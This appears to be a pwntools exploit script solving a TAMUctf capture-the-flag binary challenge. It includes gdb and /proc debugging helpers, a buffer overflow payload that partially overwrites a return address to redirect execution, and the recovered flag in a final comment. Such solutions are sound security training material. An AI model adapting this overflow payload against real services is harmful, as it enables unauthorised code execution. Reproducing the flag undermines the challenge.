from pwn import *


DEBUG = 0
if DEBUG:
     p = process('./pwn2')
     e = ELF('./pwn2')
     #scontext.log_level = 'debug'
     #libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')b0verfl0w
     #libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
     #p = process(['./reader'], env={'LD_PRELOAD': os.path.join(os.getcwd(),'libc-2.19.so')})
     libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
     #ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so') 
    
else:
     p = remote('pwn.tamuctf.com', 4322)
     #libc = ELF('./libc64.so')
     #libc = ELF('libc_64.so.6')

wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0
def leak(address, size):
   with open('/proc/%s/mem' % mypid) as mem:
      mem.seek(address)
      return mem.read(size)

def findModuleBase(pid, mem):
   name = os.readlink('/proc/%s/exe' % pid)
   with open('/proc/%s/maps' % pid) as maps:
      for line in maps:
         if name in line:
            addr = int(line.split('-')[0], 16)
            mem.seek(addr)
            if mem.read(4) == "\x7fELF":
               bitFormat = u8(leak(addr + 4, 1))
               if bitFormat == 2:
                  global wordSz
                  global hwordSz
                  global bits
                  wordSz = 8
                  hwordSz = 4
                  bits = 64
               return addr
   log.failure("Module's base address not found.")
   sys.exit(1)

def debug(addr):
    
    global mypid
    #global DEBUG
    if DEBUG==0:
        return
    mypid = proc.pidof(p)[0]
    #raw_input('debug:')
    
    with open('/proc/%s/mem' % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
        print "program_base",hex(moduleBase)
        gdb.attach(p, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))

def pwn():
    
    debug(0x7a6)
    p.recvuntil('call?')
    payload='a'*0x1e+'\xd8'
    p.sendline(payload)
   
    
    p.interactive()

if __name__ == '__main__':
   pwn()

#gigem{4ll_17_74k35_15_0n3}

